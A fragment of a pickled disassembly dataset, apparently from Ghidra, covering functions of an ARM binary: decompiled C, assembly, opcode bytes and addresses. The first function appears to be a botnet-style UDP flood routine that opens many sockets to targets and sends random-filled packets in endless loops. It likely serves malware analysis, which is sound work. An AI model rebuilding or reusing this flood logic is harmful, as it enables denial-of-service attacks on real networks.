local_30 = 0;\u000a  if (bVar10) {\u000a    local_44 = (ushort)uVar5 >> 8;\u000a  }\u000a  uVar6 = uVar6 & 0xff;\u000a  if (bVar10) {\u000a    local_44 = local_44 | (ushort)(uVar7 << 8);\u000a  }\u000a  else {\u000a    local_44 = FUN_0000a308();\u000a  }\u000a  if (sParm1 != 0) {\u000a    sVar8 = 0;\u000a    iVar9 = 0;\u000a    local_3c = 0;\u000a    do {\u000a      __buf = calloc(0xffff,1);\u000a      *(void **)(local_3c + (int)pvVar2) = __buf;\u000a      if ((uVar4 & 0xffff) == 0xffff) {\u000a        uVar1 = FUN_0000a308();\u000a        *(undefined2 *)(iVar9 + iParm2 + 2) = uVar1;\u000a      }\u000a      else {\u000a        *(ushort *)(iParm2 + iVar9 + 2) =\u000a             (ushort)((uVar4 & 0xffff) >> 8) | (ushort)((uVar4 & 0xff) << 8);\u000a      }\u000a      __addr = (sockaddr *)(iParm2 + iVar9);\u000a      __fd = socket(2,2,0);\u000a      sVar8 = sVar8 + 1;\u000a      iVar9 = iVar9 + 0x18;\u000a      *(int *)(local_3c + (int)pvVar3) = __fd;\u000a      if (__fd == -1) {\u000a        return;\u000a      }\u000a      local_34 = 0;\u000a      local_38 = CONCAT22(local_44,2);\u000a      bind(__fd,(sockaddr *)&local_38,0x10);\u000a      if ((byte)__addr[1].sa_data[2] < 0x20) {\u000a        uVar7 = *(uint *)(__addr + 1);\u000a        uVar5 = FUN_0000a308();\u000a        uVar5 = (uVar7 >> 0x18 | (uVar7 & 0xff0000) >> 8 | (uVar7 & 0xff00) << 8 | uVar7 << 0x18) +\u000a                (uVar5 >> __addr[1].sa_data[2]);\u000a        *(uint *)(__addr->sa_data + 2) =\u000a             uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 * 0x1000000;\u000a      }\u000a      connect(*(int *)(local_3c + (int)pvVar3),__addr,0x10);\u000a      local_3c = local_3c + 4;\u000a    } while (sVar8 != sParm1);\u000a  }\u000a  if (uVar6 != 0) {\u000a    do {\u000a      iVar9 = 0;\u000a      while (iVar9 < (int)sParm1) {\u000a        __buf = *(void **)((int)pvVar2 + iVar9 * 4);\u000a        FUN_0000a49c(__buf,__n);\u000a        send(*(int *)((int)pvVar3 + iVar9 * 4),__buf,__n,0x4000);\u000a        iVar9 = iVar9 + 1;\u000a      }\u000a    } while( true );\u000a  }\u000a  do {\u000a    while ((int)uVar6 < (int)sParm1) {\u000a      send(*(int *)((int)pvVar3 + uVar6 * 4),*(void **)((int)pvVar2 + uVar6 * 4),__n,0x4000);\u000a      uVar6 = uVar6 + 1;\u000a    }\u000a    uVar6 = 0;\u000a  } while( true );\u000a}\u000a\u000a
p122
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nsub sp,sp,#0x2c\nstr r1,[sp,#0x4]\nmov r1,#0x4\ncpy r5,r2\ncpy r6,r3\ncpy r7,r0\nbl 0x00008968\nmov r1,#0x4\ncpy r10,r0\ncpy r0,r7\nbl 0x00008968\nmov r4,#0x10000\nsub r4,r4,#0x1\ncpy r1,r6\nmov r2,#0x7\ncpy r3,r4\ncpy r8,r0\ncpy r0,r5\nbl 0x00008eac\nmov r12,r0, lsl #0x10\nmov r12,r12, lsr #0x10\ncpy r1,r6\nmov r2,#0x6\ncpy r3,r4\ncpy r0,r5\nstr r12,[sp,#0x8]\nbl 0x00008eac\ncpy r1,r6\nmov r9,r0, lsl #0x10\nmov r2,#0x0\nmov r3,#0x400\ncpy r0,r5\nbl 0x00008eac\nmov r2,#0x1\ncpy r3,r2\nmov r12,r0, lsl #0x10\ncpy r1,r6\ncpy r0,r5\nmov r5,r12, lsr #0x10\nbl 0x00008eac\nmov r6,r9, lsr #0x10\nmov r3,#0x0\ncmp r6,r4\nandne r2,r6,#0xff\nstr r3,[sp,#0x24]\nstr r3,[sp,#0x18]\nstr r3,[sp,#0x1c]\nstr r3,[sp,#0x20]\nmovne r3,r9, lsr #0x18\nand r0,r0,#0xff\norrne r2,r3,r2, lsl #0x8\nstr r0,[sp,#0x10]\nstrne r2,[sp,#0xc]\nbne 0x000090cc\nbl 0x0000a308\nmov r0,r0, lsl #0x10\nmov r0,r0, lsr #0x10\nstr r0,[sp,#0xc]\ncmp r7,#0x0\nbeq 0x0000920c\nmov r9,#0x0\ncpy r11,r9\nstr r9,[sp,#0x14]\nb 0x00009164\nmov r0,#0x2\ncpy r1,r0\nmov r2,#0x0\nbl 0x0000892c\nldr r12,[sp,#0x14]\ncmn r0,#0x1\nadd r9,r9,#0x1\nadd r11,r11,#0x18\nadd r1,sp,#0x18\nmov r2,#0x10\nstr r0,[r12,r8]\nbeq 0x00009200\nmov r3,#0x0\nldr r12,[sp,#0xc]\nstr r3,[sp,#0x1c]\nmov r3,#0x2\nstrh r3,[sp,#0x18]\nstrh r12,[sp,#0x1a]\nbl 0x0000898c\nldrb r3,[r6,#0x14]\ncmp r3,#0x1f\nbls 0x000091b8\nldr r2,[sp,#0x14]\ncpy r1,r6\nldr r0,[r2,r8]\nmov r2,#0x10\nbl 0x000088e4\nldr r3,[sp,#0x14]\ncmp r9,r7\nadd r3,r3,#0x4\nstr r3,[sp,#0x14]\nbeq 0x0000920c\nmov r4,#0x10000\nsub r4,r4,#0x1\nmov r1,#0x1\ncpy r0,r4\nbl 0x00008968\nldr r1,[sp,#0x8]\nand r2,r1,#0xff\nmov r3,r1, lsr #0x8\norr r3,r3,r2, lsl #0x8\nldr r2,[sp,#0x4]\nldr r12,[sp,#0x14]\ncmp r1,r4\nadd r6,r2,r11\nstr r0,[r12,r10]\nstrhne r3,[r6,#0x2]\nbne 0x000090e4\nbl 0x0000a308\nldr r1,[sp,#0x4]\nadd r6,r11,r1\nstrh r0,[r6,#0x2]\nb 0x000090e4\nldr r4,[r6,#0x10]\nbl 0x0000a308\nand r1,r4,#0xff0000\nmov r2,r4, lsr #0x18\norr r2,r2,r1, lsr #0x8\nand r3,r4,#0xff00\norr r2,r2,r3, lsl #0x8\nldrb r1,[r6,#0x14]\norr r2,r2,r4, lsl #0x18\nadd r2,r2,r0, lsr r1\nand r0,r2,#0xff0000\nmov r3,r2, lsr #0x18\norr r3,r3,r0, lsr #0x8\nand r1,r2,#0xff00\norr r3,r3,r1, lsl #0x8\norr r3,r3,r2, lsl #0x18\nstr r3,[r6,#0x4]\nb 0x0000913c\nadd sp,sp,#0x2c\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nbx lr\nldr r12,[sp,#0x10]\ncmp r12,#0x0\nbne 0x00009248\nldr r4,[sp,#0x10]\nb 0x00009230\nldr r0,[r8,r4,lsl #0x2]\nldr r1,[r10,r4,lsl #0x2]\nbl 0x00008950\nadd r4,r4,#0x1\ncmp r7,r4\ncpy r2,r5\nmov r3,#0x4000\nbgt 0x00009220\nmov r4,#0x0\nb 0x00009230\nmov r6,#0x0\ncmp r6,r7\ncpy r1,r5\nbge 0x00009248\nldr r4,[r10,r6,lsl #0x2]\ncpy r0,r4\nbl 0x0000a49c\nldr r0,[r8,r6,lsl #0x2]\ncpy r1,r4\ncpy r2,r5\nmov r3,#0x4000\nbl 0x00008950\nadd r6,r6,#0x1\nb 0x0000924c\n'
p123
S'f0 4f 2d e9\n2c d0 4d e2\n04 10 8d e5\n04 10 a0 e3\n02 50 a0 e1\n03 60 a0 e1\n00 70 a0 e1\n59 fe ff eb\n04 10 a0 e3\n00 a0 a0 e1\n07 00 a0 e1\n55 fe ff eb\n01 48 a0 e3\n01 40 44 e2\n06 10 a0 e1\n07 20 a0 e3\n04 30 a0 e1\n00 80 a0 e1\n05 00 a0 e1\n9e ff ff eb\n00 c8 a0 e1\n2c c8 a0 e1\n06 10 a0 e1\n06 20 a0 e3\n04 30 a0 e1\n05 00 a0 e1\n08 c0 8d e5\n96 ff ff eb\n06 10 a0 e1\n00 98 a0 e1\n00 20 a0 e3\n01 3b a0 e3\n05 00 a0 e1\n90 ff ff eb\n01 20 a0 e3\n02 30 a0 e1\n00 c8 a0 e1\n06 10 a0 e1\n05 00 a0 e1\n2c 58 a0 e1\n89 ff ff eb\n29 68 a0 e1\n00 30 a0 e3\n04 00 56 e1\nff 20 06 12\n24 30 8d e5\n18 30 8d e5\n1c 30 8d e5\n20 30 8d e5\n29 3c a0 11\nff 00 00 e2\n02 24 83 11\n10 00 8d e5\n0c 20 8d 15\n03 00 00 1a\n91 04 00 eb\n00 08 a0 e1\n20 08 a0 e1\n0c 00 8d e5\n00 00 57 e3\n4d 00 00 0a\n00 90 a0 e3\n09 b0 a0 e1\n14 90 8d e5\n1f 00 00 ea\n02 00 a0 e3\n00 10 a0 e1\n00 20 a0 e3\n0d fe ff eb\n14 c0 9d e5\n01 00 70 e3\n01 90 89 e2\n18 b0 8b e2\n18 10 8d e2\n10 20 a0 e3\n08 00 8c e7\n3a 00 00 0a\n00 30 a0 e3\n0c c0 9d e5\n1c 30 8d e5\n02 30 a0 e3\nb8 31 cd e1\nba c1 cd e1\n16 fe ff eb\n14 30 d6 e5\n1f 00 53 e3\n1e 00 00 9a\n14 20 9d e5\n06 10 a0 e1\n08 00 92 e7\n10 20 a0 e3\ne4 fd ff eb\n14 30 9d e5\n07 00 59 e1\n04 30 83 e2\n14 30 8d e5\n29 00 00 0a\n01 48 a0 e3\n01 40 44 e2\n01 10 a0 e3\n04 00 a0 e1\nfb fd ff eb\n08 10 9d e5\nff 20 01 e2\n21 34 a0 e1\n02 34 83 e1\n04 20 9d e5\n14 c0 9d e5\n04 00 51 e1\n0b 60 82 e0\n0a 00 8c e7\nb2 30 c6 11\ncf ff ff 1a\n57 04 00 eb\n04 10 9d e5\n01 60 8b e0\nb2 00 c6 e1\nca ff ff ea\n10 40 96 e5\n51 04 00 eb\nff 18 04 e2\n24 2c a0 e1\n21 24 82 e1\nff 3c 04 e2\n03 24 82 e1\n14 10 d6 e5\n04 2c 82 e1\n30 21 82 e0\nff 08 02 e2\n22 3c a0 e1\n20 34 83 e1\nff 1c 02 e2\n01 34 83 e1\n02 3c 83 e1\n04 30 86 e5\nce ff ff ea\n2c d0 8d e2\nf0 4f bd e8\n1e ff 2f e1\n10 c0 9d e5\n00 00 5c e3\n0b 00 00 1a\n10 40 9d e5\n03 00 00 ea\n04 01 98 e7\n04 11 9a e7\nc8 fd ff eb\n01 40 84 e2\n04 00 57 e1\n05 20 a0 e1\n01 39 a0 e3\nf7 ff ff ca\n00 40 a0 e3\nf9 ff ff ea\n00 60 a0 e3\n07 00 56 e1\n05 10 a0 e1\nfb ff ff aa\n06 41 9a e7\n04 00 a0 e1\n8d 04 00 eb\n06 01 98 e7\n04 10 a0 e1\n05 20 a0 e1\n01 39 a0 e3\nb5 fd ff eb\n01 60 86 e2\nf2 ff ff ea\n'
p124
S'.text:00008fe0\n.text:00008fe4\n.text:00008fe8\n.text:00008fec\n.text:00008ff0\n.text:00008ff4\n.text:00008ff8\n.text:00008ffc\n.text:00009000\n.text:00009004\n.text:00009008\n.text:0000900c\n.text:00009010\n.text:00009014\n.text:00009018\n.text:0000901c\n.text:00009020\n.text:00009024\n.text:00009028\n.text:0000902c\n.text:00009030\n.text:00009034\n.text:00009038\n.text:0000903c\n.text:00009040\n.text:00009044\n.text:00009048\n.text:0000904c\n.text:00009050\n.text:00009054\n.text:00009058\n.text:0000905c\n.text:00009060\n.text:00009064\n.text:00009068\n.text:0000906c\n.text:00009070\n.text:00009074\n.text:00009078\n.text:0000907c\n.text:00009080\n.text:00009084\n.text:00009088\n.text:0000908c\n.text:00009090\n.text:00009094\n.text:00009098\n.text:0000909c\n.text:000090a0\n.text:000090a4\n.text:000090a8\n.text:000090ac\n.text:000090b0\n.text:000090b4\n.text:000090b8\n.text:000090bc\n.text:000090c0\n.text:000090c4\n.text:000090c8\n.text:000090cc\n.text:000090d0\n.text:000090d4\n.text:000090d8\n.text:000090dc\n.text:000090e0\n.text:000090e4\n.text:000090e8\n.text:000090ec\n.text:000090f0\n.text:000090f4\n.text:000090f8\n.text:000090fc\n.text:00009100\n.text:00009104\n.text:00009108\n.text:0000910c\n.text:00009110\n.text:00009114\n.text:00009118\n.text:0000911c\n.text:00009120\n.text:00009124\n.text:00009128\n.text:0000912c\n.text:00009130\n.text:00009134\n.text:00009138\n.text:0000913c\n.text:00009140\n.text:00009144\n.text:00009148\n.text:0000914c\n.text:00009150\n.text:00009154\n.text:00009158\n.text:0000915c\n.text:00009160\n.text:00009164\n.text:00009168\n.text:0000916c\n.text:00009170\n.text:00009174\n.text:00009178\n.text:0000917c\n.text:00009180\n.text:00009184\n.text:00009188\n.text:0000918c\n.text:00009190\n.text:00009194\n.text:00009198\n.text:0000919c\n.text:000091a0\n.text:000091a4\n.text:000091a8\n.text:000091ac\n.text:000091b0\n.text:000091b4\n.text:000091b8\n.text:000091bc\n.text:000091c0\n.text:000091c4\n.text:000091c8\n.text:000091cc\n.text:000091d0\n.text:000091d4\n.text:000091d8\n.text:000091dc\n.text:000091e0\n.text:000091e4\n.text:000091e8\n.text:000091ec\n.text:000091f0\n.text:000091f4\n.text:000091f8\n.text:000091fc\n.text:00009200\n.text:00009204\n.text:00009208\n.text:0000920c\n.text:00009210\n.text:00009214\n.text:00009218\n.text:0000921c\n.text:00009220\n.text:00009224\n.text:00009228\n.text:0000922c\n.text:00009230\n.text:00009234\n.text:00009238\n.text:0000923c\n.text:00009240\n.text:00009244\n.text:00009248\n.text:0000924c\n.text:00009250\n.text:00009254\n.text:00009258\n.text:0000925c\n.text:00009260\n.text:00009264\n.text:00009268\n.text:0000926c\n.text:00009270\n.text:00009274\n.text:00009278\n.text:0000927c\n'
p125
tp126
sS'clock'
p127
(S'\n__stdcall clock()\n'
p128
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aclock_t clock(void)\u000a\u000a{\u000a  clock_t cVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a3c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  cVar1 = (*(code *)PTR_LAB_00013308)();\u000a  return cVar1;\u000a}\u000a\u000a
p129
S'adr r12,0x8a3c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8cc]!\n'
p130
S'00 c6 8f e2\n0a ca 8c e2\ncc f8 bc e5\n'
p131
S'.plt:00008a34\n.plt:00008a38\n.plt:00008a3c\n'
p132
tp133
sS'setsid'
p134
(S'\n__stdcall setsid()\n'
p135
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__pid_t setsid(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a48. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  _Var1 = (*(code *)PTR_LAB_0001330c)();\u000a  return _Var1;\u000a}\u000a\u000a
p136
S'adr r12,0x8a48\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8c4]!\n'
p137
S'00 c6 8f e2\n0a ca 8c e2\nc4 f8 bc e5\n'
p138
S'.plt:00008a40\n.plt:00008a44\n.plt:00008a48\n'
p139
tp140
sS'exit'
p141
(S'\n__stdcall exit(int __status)\n'
p142
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid exit(int __status)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a24. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013300)();\u000a  return;\u000a}\u000a\u000a
p143
S'adr r12,0x8a24\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8dc]!\n'
p144
S'00 c6 8f e2\n0a ca 8c e2\ndc f8 bc e5\n'
p145
S'.plt:00008a1c\n.plt:00008a20\n.plt:00008a24\n'
p146
tp147
sS'FUN_0000ac1c'
p148
(S'\n__stdcall FUN_0000ac1c()\n'
p149
V\u000auint FUN_0000ac1c(undefined *puParm1,byte *pbParm2)\u000a\u000a{\u000a  uint uVar1;\u000a  uint uVar2;\u000a  uint uVar3;\u000a  \u000a  uVar1 = (uint)*pbParm2;\u000a  uVar2 = uVar1;\u000a  uVar3 = uVar1;\u000a  if (*pbParm2 != 0) {\u000a    uVar2 = 0;\u000a    do {\u000a      uVar2 = uVar2 + 1;\u000a      uVar3 = uVar2;\u000a    } while (pbParm2[uVar2] != 0);\u000a  }\u000a  while( true ) {\u000a    *puParm1 = (char)uVar1;\u000a    if (uVar2 - 1 == 0xffffffff) break;\u000a    pbParm2 = pbParm2 + 1;\u000a    uVar1 = (uint)*pbParm2;\u000a    puParm1 = puParm1 + 1;\u000a    uVar2 = uVar2 - 1;\u000a  }\u000a  return uVar3;\u000a}\u000a\u000a
p150
S'ldrb r2,[r1,#0x0]\ncmp r2,#0x0\ncpyeq r12,r2\nbeq 0x0000ac40\nmov r12,#0x0\nadd r12,r12,#0x1\nldrb r3,[r12,r1]\ncmp r3,#0x0\nbne 0x0000ac30\ncpy r3,r12\nb 0x0000ac4c\nldrb r2,[r1,#0x1]!\nsub r3,r3,#0x1\ncmn r3,#0x1\nstrb r2,[r0],#0x1\nbne 0x0000ac48\ncpy r0,r12\nbx lr\n'
p151
S'00 20 d1 e5\n00 00 52 e3\n02 c0 a0 01\n04 00 00 0a\n00 c0 a0 e3\n01 c0 8c e2\n01 30 dc e7\n00 00 53 e3\nfb ff ff 1a\n0c 30 a0 e1\n00 00 00 ea\n01 20 f1 e5\n01 30 43 e2\n01 00 73 e3\n01 20 c0 e4\nfa ff ff 1a\n0c 00 a0 e1\n1e ff 2f e1\n'
p152
S'.text:0000ac1c\n.text:0000ac20\n.text:0000ac24\n.text:0000ac28\n.text:0000ac2c\n.text:0000ac30\n.text:0000ac34\n.text:0000ac38\n.text:0000ac3c\n.text:0000ac40\n.text:0000ac44\n.text:0000ac48\n.text:0000ac4c\n.text:0000ac50\n.text:0000ac54\n.text:0000ac58\n.text:0000ac5c\n.text:0000ac60\n'
p153
tp154
sS'FUN_00008f1c'
p155
(S'\n__stdcall FUN_00008f1c()\n'
p156
V\u000aundefined4 FUN_00008f1c(void)\u000a\u000a{\u000a  byte bVar1;\u000a  undefined *puVar2;\u000a  undefined *puVar3;\u000a  undefined4 *puVar4;\u000a  void *__ptr;\u000a  \u000a  puVar4 = (undefined4 *)calloc(1,8);\u000a  puVar3 = PTR_DAT_00008fd4;\u000a  puVar2 = PTR_DAT_00008fd0;\u000a  bVar1 = *PTR_DAT_00008fd0;\u000a  __ptr = *(void **)PTR_DAT_00008fd4;\u000a  *(undefined **)puVar4 = PTR_FUN_00008fd8;\u000a  *(undefined *)(puVar4 + 1) = 1;\u000a  __ptr = realloc(__ptr,((uint)bVar1 + 1) * 4);\u000a  bVar1 = *puVar2;\u000a  *(undefined4 **)((int)__ptr + (uint)bVar1 * 4) = puVar4;\u000a  *puVar2 = bVar1 + 1;\u000a  *(void **)puVar3 = __ptr;\u000a  puVar4 = (undefined4 *)calloc(1,8);\u000a  bVar1 = *puVar2;\u000a  __ptr = *(void **)puVar3;\u000a  *(undefined **)puVar4 = PTR_FUN_00008fdc;\u000a  *(undefined *)(puVar4 + 1) = 2;\u000a  __ptr = realloc(__ptr,((uint)bVar1 + 1) * 4);\u000a  bVar1 = *puVar2;\u000a  *(void **)puVar3 = __ptr;\u000a  *(undefined4 **)((int)__ptr + (uint)bVar1 * 4) = puVar4;\u000a  *puVar2 = bVar1 + 1;\u000a  return 1;\u000a}\u000a\u000a
p157
S'stmdb sp!,{ r4 r5 r6 r7 lr }\nmov r1,#0x8\nsub sp,sp,#0x4\nmov r0,#0x1\nbl 0x00008968\nldr r5,[0x8fd0]\nldrb r1,[r5,#0x0]\nldr r6,[0x8fd4]\nldr r3,[0x8fd8]\nmov r7,#0x1\ncpy r4,r0\nadd r1,r1,#0x1\nldr r0,[r6,#0x0]\nstr r3,[r4,#0x0]\nstrb r7,[r4,#0x4]\nmov r1,r1, lsl #0x2\nbl 0x000089c8\nldrb r3,[r5,#0x0]\ncpy r2,r0\nstr r4,[r0,r3,lsl #0x2]\nmov r1,#0x8\nadd r3,r3,r7\ncpy r0,r7\nstrb r3,[r5,#0x0]\nstr r2,[r6,#0x0]\nbl 0x00008968\nldrb r1,[r5,#0x0]\nldr r2,[0x8fdc]\ncpy r4,r0\nmov r3,#0x2\nadd r1,r1,r7\nldr r0,[r6,#0x0]\nstr r2,[r4,#0x0]\nstrb r3,[r4,#0x4]\nmov r1,r1, lsl #0x2\nbl 0x000089c8\nldrb r3,[r5,#0x0]\nstr r0,[r6,#0x0]\nstr r4,[r0,r3,lsl #0x2]\nadd r2,r3,r7\ncpy r0,r7\nstrb r2,[r5,#0x0]\nadd sp,sp,#0x4\nldmia sp!,{ r4 r5 r6 r7 lr }\nbx lr\n'
p158
S'f0 40 2d e9\n08 10 a0 e3\n04 d0 4d e2\n01 00 a0 e3\n8d fe ff eb\n98 50 9f e5\n00 10 d5 e5\n94 60 9f e5\n94 30 9f e5\n01 70 a0 e3\n00 40 a0 e1\n01 10 81 e2\n00 00 96 e5\n00 30 84 e5\n04 70 c4 e5\n01 11 a0 e1\n99 fe ff eb\n00 30 d5 e5\n00 20 a0 e1\n03 41 80 e7\n08 10 a0 e3\n07 30 83 e0\n07 00 a0 e1\n00 30 c5 e5\n00 20 86 e5\n78 fe ff eb\n00 10 d5 e5\n4c 20 9f e5\n00 40 a0 e1\n02 30 a0 e3\n07 10 81 e0\n00 00 96 e5\n00 20 84 e5\n04 30 c4 e5\n01 11 a0 e1\n86 fe ff eb\n00 30 d5 e5\n00 00 86 e5\n03 41 80 e7\n07 20 83 e0\n07 00 a0 e1\n00 20 c5 e5\n04 d0 8d e2\nf0 40 bd e8\n1e ff 2f e1\n'
p159
S'.text:00008f1c\n.text:00008f20\n.text:00008f24\n.text:00008f28\n.text:00008f2c\n.text:00008f30\n.text:00008f34\n.text:00008f38\n.text:00008f3c\n.text:00008f40\n.text:00008f44\n.text:00008f48\n.text:00008f4c\n.text:00008f50\n.text:00008f54\n.text:00008f58\n.text:00008f5c\n.text:00008f60\n.text:00008f64\n.text:00008f68\n.text:00008f6c\n.text:00008f70\n.text:00008f74\n.text:00008f78\n.text:00008f7c\n.text:00008f80\n.text:00008f84\n.text:00008f88\n.text:00008f8c\n.text:00008f90\n.text:00008f94\n.text:00008f98\n.text:00008f9c\n.text:00008fa0\n.text:00008fa4\n.text:00008fa8\n.text:00008fac\n.text:00008fb0\n.text:00008fb4\n.text:00008fb8\n.text:00008fbc\n.text:00008fc0\n.text:00008fc4\n.text:00008fc8\n.text:00008fcc\n'
p160
tp161
sS'abort'
p162
(S'\n__stdcall abort()\n'
p163
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid abort(void)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008964. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_000132c0)();\u000a  return;\u000a}\u000a\u000a
p164
S'adr r12,0x8964\nadd r12,r12,#0xa000\nldr pc,[r12,#0x95c]!\n'
p165
S'00 c6 8f e2\n0a ca 8c e2\n5c f9 bc e5\n'
p166
S'.plt:0000895c\n.plt:00008960\n.plt:00008964\n'
p167
tp168
sS'FUN_0000a49c'
p169
(S'\n__stdcall FUN_0000a49c()\n'
p170
V\u000avoid FUN_0000a49c(uint *puParm1,int iParm2)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  undefined *puVar3;\u000a  undefined *puVar4;\u000a  uint uVar5;\u000a  uint uVar6;\u000a  uint uVar7;\u000a  uint uVar8;\u000a  uint uVar9;\u000a  uint uVar10;\u000a  uint *puVar11;\u000a  uint uVar12;\u000a  bool bVar13;\u000a  \u000a  puVar4 = PTR_DAT_0000a574;\u000a  puVar3 = PTR_DAT_0000a570;\u000a  puVar2 = PTR_DAT_0000a56c;\u000a  puVar1 = PTR_DAT_0000a568;\u000a  if (0 < iParm2) {\u000a    uVar7 = *(uint *)PTR_DAT_0000a570;\u000a    uVar5 = *(uint *)PTR_DAT_0000a56c;\u000a    uVar8 = *(uint *)PTR_DAT_0000a574;\u000a    uVar9 = *(uint *)PTR_DAT_0000a568;\u000a    do {\u000a      uVar12 = uVar9;\u000a      uVar10 = uVar5;\u000a      uVar6 = uVar7;\u000a      uVar7 = uVar8 ^ uVar8 << 0xb;\u000a      uVar9 = uVar12 ^ uVar12 >> 0x13 ^ uVar7 ^ uVar7 >> 8;\u000a      if (iParm2 < 4) {\u000a        uVar7 = uVar8 ^ uVar8 << 0xb;\u000a        bVar13 = iParm2 == 1;\u000a        uVar9 = uVar12 ^ uVar12 >> 0x13 ^ uVar7 ^ uVar7 >> 8;\u000a        iParm2 = iParm2 + -2;\u000a        if (bVar13) {\u000a          uVar8 = uVar8 ^ uVar8 << 0xb;\u000a          uVar7 = uVar12 ^ uVar12 >> 0x13 ^ uVar8 ^ uVar8 >> 8;\u000a          *(uint *)puVar4 = uVar6;\u000a          *(uint *)puVar3 = uVar10;\u000a          *(uint *)puVar2 = uVar12;\u000a          *(uint *)puVar1 = uVar7;\u000a          *(char *)puParm1 = (char)uVar7;\u000a          return;\u000a        }\u000a        puVar11 = (uint *)((int)puParm1 + 2);\u000a        *(short *)puParm1 = (short)uVar9;\u000a      }\u000a      else {\u000a        puVar11 = puParm1 + 1;\u000a        *puParm1 = uVar9;\u000a        iParm2 = iParm2 + -4;\u000a      }\u000a      uVar7 = uVar10;\u000a      uVar5 = uVar12;\u000a      puParm1 = puVar11;\u000a      uVar8 = uVar6;\u000a    } while (0 < iParm2);\u000a    *(uint *)puVar1 = uVar9;\u000a    *(uint *)puVar2 = uVar12;\u000a    *(uint *)puVar3 = uVar10;\u000a    *(uint *)puVar4 = uVar6;\u000a  }\u000a  return;\u000a}\u000a\u000a
p171
S'cmp r1,#0x0\nstmdb sp!,{ r4 r5 r6 r7 r8 r10 lr }\ncpy r5,r0\nble 0x0000a54c\nldr r10,[0xa568]\nldr r8,[0xa56c]\nldr r7,[0xa570]\nldr r6,[0xa574]\nldr lr,[r10,#0x0]\nldr r4,[r8,#0x0]\nldr r0,[r7,#0x0]\nldr r12,[r6,#0x0]\nb 0x0000a4ec\nstrh r3,[r5],#0x2\ncmp r1,#0x0\ncpy r12,r0\nble 0x0000a554\ncpy r0,r4\ncpy r4,lr\ncpy lr,r3\neor r2,r12,r12, lsl #0xb\neor r3,lr,lr, lsr #0x13\neor r3,r3,r2\ncmp r1,#0x3\neor r3,r3,r2, lsr #0x8\nstrgt r3,[r5],#0x4\nsubgt r1,r1,#0x4\nbgt 0x0000a4d4\neor r2,r12,r12, lsl #0xb\neor r3,lr,lr, lsr #0x13\neor r3,r3,r2\ncmp r1,#0x1\neor r3,r3,r2, lsr #0x8\nsub r1,r1,#0x2\nbne 0x0000a4d0\neor r2,r12,r12, lsl #0xb\neor r3,lr,lr, lsr #0x13\neor r3,r3,r2\neor r3,r3,r2, lsr #0x8\nstr r0,[r6,#0x0]\nstr r4,[r7,#0x0]\nstr lr,[r8,#0x0]\nstr r3,[r10,#0x0]\nstrb r3,[r5,#0x0]\nldmia sp!,{ r4 r5 r6 r7 r8 r10 lr }\nbx lr\nstr r3,[r10,#0x0]\nstr lr,[r8,#0x0]\nstr r4,[r7,#0x0]\nstr r0,[r6,#0x0]\nb 0x0000a54c\n'
p172
S'00 00 51 e3\nf0 45 2d e9\n00 50 a0 e1\n27 00 00 da\nb4 a0 9f e5\nb4 80 9f e5\nb4 70 9f e5\nb4 60 9f e5\n00 e0 9a e5\n00 40 98 e5\n00 00 97 e5\n00 c0 96 e5\n06 00 00 ea\nb2 30 c5 e0\n00 00 51 e3\n00 c0 a0 e1\n1c 00 00 da\n04 00 a0 e1\n0e 40 a0 e1\n03 e0 a0 e1\n8c 25 2c e0\nae 39 2e e0\n02 30 23 e0\n03 00 51 e3\n22 34 23 e0\n04 30 85 c4\n04 10 41 c2\nf1 ff ff ca\n8c 25 2c e0\nae 39 2e e0\n02 30 23 e0\n01 00 51 e3\n22 34 23 e0\n02 10 41 e2\ne9 ff ff 1a\n8c 25 2c e0\nae 39 2e e0\n02 30 23 e0\n22 34 23 e0\n00 00 86 e5\n00 40 87 e5\n00 e0 88 e5\n00 30 8a e5\n00 30 c5 e5\nf0 45 bd e8\n1e ff 2f e1\n00 30 8a e5\n00 e0 88 e5\n00 40 87 e5\n00 00 86 e5\nf8 ff ff ea\n'
p173
S'.text:0000a49c\n.text:0000a4a0\n.text:0000a4a4\n.text:0000a4a8\n.text:0000a4ac\n.text:0000a4b0\n.text:0000a4b4\n.text:0000a4b8\n.text:0000a4bc\n.text:0000a4c0\n.text:0000a4c4\n.text:0000a4c8\n.text:0000a4cc\n.text:0000a4d0\n.text:0000a4d4\n.text:0000a4d8\n.text:0000a4dc\n.text:0000a4e0\n.text:0000a4e4\n.text:0000a4e8\n.text:0000a4ec\n.text:0000a4f0\n.text:0000a4f4\n.text:0000a4f8\n.text:0000a4fc\n.text:0000a500\n.text:0000a504\n.text:0000a508\n.text:0000a50c\n.text:0000a510\n.text:0000a514\n.text:0000a518\n.text:0000a51c\n.text:0000a520\n.text:0000a524\n.text:0000a528\n.text:0000a52c\n.text:0000a530\n.text:0000a534\n.text:0000a538\n.text:0000a53c\n.text:0000a540\n.text:0000a544\n.text:0000a548\n.text:0000a54c\n.text:0000a550\n.text:0000a554\n.text:0000a558\n.text:0000a55c\n.text:0000a560\n.text:0000a564\n'
p174
tp175
sS'sigemptyset'
p176
(S'\n__stdcall sigemptyset(sigset_t * __set)\n'
p177
